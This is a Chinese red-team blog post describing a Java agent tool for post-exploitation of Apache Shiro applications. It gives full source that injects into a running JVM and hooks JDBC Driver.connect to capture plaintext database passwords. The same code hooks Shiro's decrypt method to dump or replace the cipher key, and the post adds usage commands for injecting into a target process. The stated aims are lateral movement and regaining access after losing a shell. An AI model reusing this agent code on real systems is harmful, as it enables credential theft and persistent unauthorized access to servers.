
## Shiro 后渗透拓展面

- - -

### [0x00 前言](#toc_0x00)

在 shiro 利用工具之前是加了个修改 key 的功能，但这个功能有个遗憾，并不是在所有的中间件是通用的，也是我写 shiro 工具的一个遗憾吧。之后想过用深度优先算法将这个功能写进去，发现代码工程量太大了，所以不了了之。在前两天看到一个项目[whwlsfb/JDumpSpider](https://github.com/whwlsfb/JDumpSpider)来的又来了灵感，本来是因为静态分析的工具，深入了解之后，发现这个实现很麻烦，无论从操作角度和实现角度来看。但这两天又看到北辰师傅写的文章[从内存中 Dump JDBC 数据库明文密码](https://mp.weixin.qq.com/s/QCfqO2BJuhSOr58rldZzxA)，看文章中的仓库源码，发现更简单了。

ps：由于时间关系，短暂的一天左右的时间学习。所以导致可能有些地方不是很严谨，如有错误，还请谅解。

- - -

### [0x01 源码阅读学习](#toc_0x01)

第一眼讲仓库 git 到本地之后发现，这个被北辰师傅写的很简单。短短二百行就实现了 Dump 数据库密码的功能，项目地址[BeichenDream/InjectJDBC](https://github.com/BeichenDream/InjectJDBC)，看项目结构也能发现非常的简单。

```plain
InjectJDBC
 ├── DatabaseInject.iml
 ├── libs
 │   ├── GenericAgentTools.jar
 │   └── javassist-3.23.1-GA.jar
 ├── README.md
 └── src
     ├── com
     │   └── abc
     │       └── Main.java
     └── META-INF
         └── MANIFEST.MF
```

**GenericAgentTools.jar**应该是北辰师傅的另一个项目，**javassist-3.23.1-GA.jar**这个功能大家应该都知道。这两行是 GenericAgentTools.jar 中内置的，也能发现被内置好了。

```plain
// agent 加载到目标 jvm 的 id 中
VirtualMachine virtualMachine = VirtualMachine.attach(targetPid);
// 第一个参数获取新生成的 jar 包的路径，第二个参数是给 agent 的 jar 包的输入参数。
 virtualMachine.loadAgent(getJarFileByClass(Main.class),outFile);
```

幸好北辰师傅上传代码的时候没有把这个删除掉，不然我可能还要才一波坑。

[![image-20220308213612045](assets/1698894604-dbbfab6960cf94f2a270fd919e69af6f.png)](https://cdn.jsdelivr.net/gh/SummerSec/Images/12u3612ec12u3612ec.png)

为什么这么说呢？虽然在整个项目中**getMethodSignature**没有被调用，但也不能忽视他的作用。比例说红框中的代码，就是得靠**getMethodSignature**获取到方法的签名。

[![image-20220308213842668](assets/1698894604-0f761f7143c85551f68210a616e0ace1.png)](https://cdn.jsdelivr.net/gh/SummerSec/Images/42u3842ec42u3842ec.png)

这里简单说一下大致作用，具体得配合文章[从内存中 Dump JDBC 数据库明文密码](https://mp.weixin.qq.com/s/QCfqO2BJuhSOr58rldZzxA)才能看懂。

<font color=red>通过循环判断类 clazz 是否是**Driver.class**的子类、实现类，然后再 ClassPool 中加入 clazz 和 clazz 的类加载器。然后修改对应的 connect 方法代码，在前面加入自定义的代码。</font>

```plain
                // 判断类clazz是否是Driver.class的子类、实现类
                if (Driver.class.isAssignableFrom(clazz)){
                    ClassPool classPool = new ClassPool(true);
                    // 加入clazz的classpath
                    classPool.insertClassPath(new ClassClassPath(clazz));
                    // 加入类加载器
                    classPool.insertClassPath(new LoaderClassPath(clazz.getClassLoader()));
                    CtClass ctClass = classPool.get(clazz.getName());
                    // 获取类中的connect方法
                    CtMethod ctMethod = ctClass.getMethod("connect","(Ljava/lang/String;Ljava/util/Properties;)Ljava/sql/Connection;");
                    // 修改connect方法，再开头加入自定义代码
                    ctMethod.insertBefore(String.format("                    try {\n" +
                            "                        java.lang.Class.forName(\"%s\",true,java.lang.ClassLoader.getSystemClassLoader()).getMethod(\"add\", new java.lang.Class[]{java.lang.String.class, java.util.Properties.class}).invoke(null,new java.lang.Object[]{$1,$2});\n" +
                            "                    }catch (java.lang.Throwable e){\n" +
                            "                        e.printStackTrace();\n" +
                            "                        \n" +
                            "                    }",Main.class.getName()));

                    inst.redefineClasses(new ClassDefinition(clazz,ctClass.toBytecode()));
                    ctClass.detach();
                }
```

自定义的代码块调用了 agent 中的**Main.class**的**add**方法，之后的这块可以继续看北辰师傅文章[从内存中 Dump JDBC 数据库明文密码](https://mp.weixin.qq.com/s/QCfqO2BJuhSOr58rldZzxA)。<font color=red>总结一下，大概思路。首先通过 agent 将目标的接口或者是抽象类 hook 了，然后对其修改代码逻辑，从而实现的需要实现的目的。并且生成 agent 已经被北辰师傅集成了，我们无需考虑，这使得我们的工作内容大大的简化了。</font>

- - -

### [0x02 shiro 后渗透实现](#toc_0x02-shiro)

现在我们能 hook 我们想要的所有类，并且也能修改其代码逻辑，加入自己想要的功能。比例说北辰师傅就调用了 agent 中 Main.class 的 add 方法。前面提到我们修改 key 的功能，并不是通用的，但 agent 的优势可以完美解决这个问题。

- - -

#### [修改 shiro 的 key](#toc_shirokey)

在之前的博文中[shiro 反序列化漏洞攻击拓展面–修改 key](https://sumsec.me/2022/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E6%8B%93%E5%B1%95%E9%9D%A2--%E4%BF%AE%E6%94%B9key.html)提到，想要修改掉 shiro 的 key 就需要调用内存中的**AbstractRememberMeManager**对象。调用**AbstractRememberMeManager**对象的<font color=red>setCipherKey</font>方法，才能实现修改 shiro 的 key 的目的。最开始我的想法和北辰师傅一样，调用 agent 中的某一类的方法。但这导致了一个问题，在 agent 中，我们无法直接获取实例化**AbstractRememberMeManager**对象，但其实也有解决方法，使用深度优先算法获取实例化**AbstractRememberMeManager**对象。这也导致了实现变得很麻烦了，相比北辰师傅的实现就显得很笨重了。所以我放弃了这种方式，我将所有的代码逻辑都加入到**AbstractRememberMeManager**对象的**decrypt**方法，其实只需要添加一行代码即可非常的简单。

```plain
setCipherKey(org.apache.shiro.codec.Base64.decode(temp));
// temp 传入修改的 shiro 的值
```

- - -

#### [获取 shiro 的 key](#toc_shirokey_1)

为什么我们需要获取 shiro 的 key 呢？其实这才是我最开始想做的事情，修改 key 只是后来想到加上去的。本意和北辰的文章[从内存中 Dump JDBC 数据库明文密码](https://mp.weixin.qq.com/s/QCfqO2BJuhSOr58rldZzxA)类似，但也有不同的地方。我们来假设一个场景来帮助大家来理解，如果我们一个站点存在 shiro，但我们跑不出 key。但我们通过了其他 RCE 或者任意文件上传的手段获取到了 shell，这时候我们就可以通过本文中的工具去获取 shiro 的 key 值。我们都获取到了 shell，为什么还要获取 key 呢？

1.  可以方便我们快速的实现内网横向，毕竟 shiro 这个漏洞利用已经非常非常成熟了。
2.  可以将这个 key 加入我们 key 字典中，方便之后的项目中测试。
3.  如果我们修改 key，但我们一失手忘记掉了 key，也还要补救的措施。
4.  如果点掉了，可以通过 shiro 这个入口快速重新切进去。

目前我和师傅 hl0rey 所能想到获取 shiro 的 key 的四点价值，这么来看获取 key 是非常有必要的功能。

具体实现代码其实也非常的简单，最终笔者将北辰师傅获取 JDBC 字符串、修改 key 和获取 key 三个功能整合在了一起，加了一个判断。

```plain
fileOutputStream.write(org.apache.shiro.codec.Base64.encodeToString(getDecryptionCipherKey()).getBytes());
```

最终完整的实现代码如下：

```plain
    public static void agentmain(String agentArg, Instrumentation inst){
        arg2 = agentArg;
        Class[] classes  = inst.getAllLoadedClasses();

        for (int i = 0; i < classes.length; i++) {
            Class clazz = classes[i];
            try {
                // 判断类clazz是否是Driver.class的子类、实现类
                if (Driver.class.isAssignableFrom(clazz)){
                    ClassPool classPool = new ClassPool(true);
                    // 加入clazz的classpath
                    classPool.insertClassPath(new ClassClassPath(clazz));
                    // 加入类加载器
                    classPool.insertClassPath(new LoaderClassPath(clazz.getClassLoader()));
                    CtClass ctClass = classPool.get(clazz.getName());
                    // 获取类中的connect方法 方法desc有getMethodSignature方法获取
                    CtMethod ctMethod = ctClass.getMethod("connect","(Ljava/lang/String;Ljava/util/Properties;)Ljava/sql/Connection;");
                    // 修改connect方法，再开头加入自定义代码
                    ctMethod.insertBefore(String.format("                    try {\n" +
                            "                        java.lang.Class.forName(\"%s\",true,java.lang.ClassLoader.getSystemClassLoader()).getMethod(\"add\", new java.lang.Class[]{java.lang.String.class, java.util.Properties.class}).invoke(null,new java.lang.Object[]{$1,$2});\n" +
                            "                    }catch (java.lang.Throwable e){\n" +
//                            "                        e.printStackTrace();\n" +
                            "                        \n" +
                            "                    }",Main.class.getName()));

                    inst.redefineClasses(new ClassDefinition(clazz,ctClass.toBytecode()));
                    ctClass.detach();
                }
            }catch (Throwable e){
                e.printStackTrace();
            }
        }


        Class cls = null;
        try {
            cls = Class.forName("org.apache.shiro.mgt.AbstractRememberMeManager");
            for(int i = 0; i < classes.length; i++) {
                Class clazz = classes[i];
                try {
                    // 判断类clazz是否是org.apache.shiro.mgt.AbstractRememberMeManager.class的子类、实现类
                    if(cls.isAssignableFrom(clazz)){
                        ClassPool classPool = new ClassPool(true);
                        classPool.insertClassPath(new ClassClassPath(clazz));
                        classPool.insertClassPath(new LoaderClassPath(clazz.getClassLoader()));
                        CtClass ctClass = classPool.get(clazz.getName());
                        CtMethod ctMethod = ctClass.getMethod("decrypt", "([B)[B");
                        ctMethod.insertBefore(String.format("java.lang.String temp = \"%s\";\n" +
                                "if(temp.endsWith(\"\\.txt\")){" +
                                "try {\n" +
                                "   " +
                                "   java.io.FileOutputStream fileOutputStream = new java.io.FileOutputStream(new java.io.File(temp),true);\n" +
                                "   fileOutputStream.write(\"Shiro key: \".getBytes());\n" +
//                                "   java.lang.System.out.println(\"get shiro keying\");\n" +
//                                "   java.lang.System.out.println(org.apache.shiro.codec.Base64.encodeToString(getDecryptionCipherKey()));\n" +
                                "   fileOutputStream.write(org.apache.shiro.codec.Base64.encodeToString(getDecryptionCipherKey()).getBytes());\n" +
                                "   fileOutputStream.write(\"\\n\".getBytes());\n" +
                                "   fileOutputStream.flush();\n" +
                                "   fileOutputStream.close();\n}" +
                                "catch(java.lang.Throwable e){\n" +
//                                " e.printStackTrace();\n" +
                                "}\n}else{\n" +
                                "try{\n" +
                                "setCipherKey(org.apache.shiro.codec.Base64.decode(temp));\n" +
//                                "java.lang.System.out.println(\"set shiro key ing!\");\n}
                                "catch(java.lang.Throwable e){\n" +
//                                "e.printStackTrace();" +
                                "\n}\n}\n",arg2));
                        inst.redefineClasses(new ClassDefinition(clazz,ctClass.toBytecode()));
                        ctClass.detach();
                    }


                }catch (Throwable e){
                    e.printStackTrace();
                }
            }
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }

    }
```

- - -

### [0x03 使用方法](#toc_0x03)

本地环境测试 DEMO

1.  首先可以确定环境的 key 是默认的，并且是可以执行命令的。

[![image-20220308224448662](assets/1698894604-2e68c1e27bdbd5321d3ce34e113d434a.png)](https://cdn.jsdelivr.net/gh/SummerSec/Images/48u4448ec48u4448ec.png)

[![image-20220308224621598](assets/1698894604-1c214dae05a026e00afdb6026e7a27dc.png)](https://cdn.jsdelivr.net/gh/SummerSec/Images/21u4621ec21u4621ec.png)

1.  执行命令`java -jar AgentInjectTool.jar list`，获取环境启动的 pid。

[![image-20220308224738899](assets/1698894604-966f65d3a80040709ee83f8689478d5f.png)](https://cdn.jsdelivr.net/gh/SummerSec/Images/39u4739ec39u4739ec.png)

1.  执行命令`java -jar AgentInjectTool.jar inject {pid} {file.txt|shirokey}`

> java -jar AgentInjectTool.jar inject 96864 G:/temp/temp.txt
> 
> // 注意一定得使用反斜杠<font color=red>/</font>

[![image-20220308225003956](assets/1698894604-c3221b2fb29ee7e83a540bad82d6950d.png)](https://cdn.jsdelivr.net/gh/SummerSec/Images/14u5014ec14u5014ec.png)

> 触发获取 key 操作，需要我们手动发送请求登录请求，无论正确与否均可。比例说使用工具的**检测当前密钥**功能

[![image-20220308232335062](assets/1698894604-75c6e4c86e9399251bd6afab12b07c28.png)](https://cdn.jsdelivr.net/gh/SummerSec/Images/35u2335ec35u2335ec.png)

> java -jar AgentInjectTool.jar inject 96864 ES2ZK5q7qgNrkigR4EmGNg==

[![image-20220308232433218](assets/1698894604-edcdd9c8a82d69b8cf7038942e5375be.png)](https://cdn.jsdelivr.net/gh/SummerSec/Images/33u2433ec33u2433ec.png)

[![image-20220308232505324](assets/1698894604-90fdc18e1702ebf3f073c227a68c7a0a.png)](https://cdn.jsdelivr.net/gh/SummerSec/Images/5u255ec5u255ec.png)

> 使用获取 key 功能

[![image-20220308232609815](assets/1698894604-8b7b8272abfe25a98bbb0962f879b838.png)](https://cdn.jsdelivr.net/gh/SummerSec/Images/9u269ec9u269ec.png)

ps: 工具下载地址[https://github.com/SummerSec/AgentInjectTool](https://github.com/SummerSec/AgentInjectTool)

- - -

### [0x04 总结](#toc_0x04)

之前北辰师傅的几个项目我还不太看懂，这次也学习到了很多。也算看明白了一点点，我和北辰之间的差距无法跨越。最后这个项目也可能是作为红队攻防项目的最后一个吧，之后可能不会在写这种项目，或者说工具了。还有其他的几个自己开的项目，估计也维护不了，抱歉了各位。。。

- - -

### [0x05 参考](#toc_0x05)

[https://github.com/BeichenDream/InjectJDBC](https://github.com/BeichenDream/InjectJDBC)

[https://mp.weixin.qq.com/s/QCfqO2BJuhSOr58rldZzxA](https://mp.weixin.qq.com/s/QCfqO2BJuhSOr58rldZzxA)
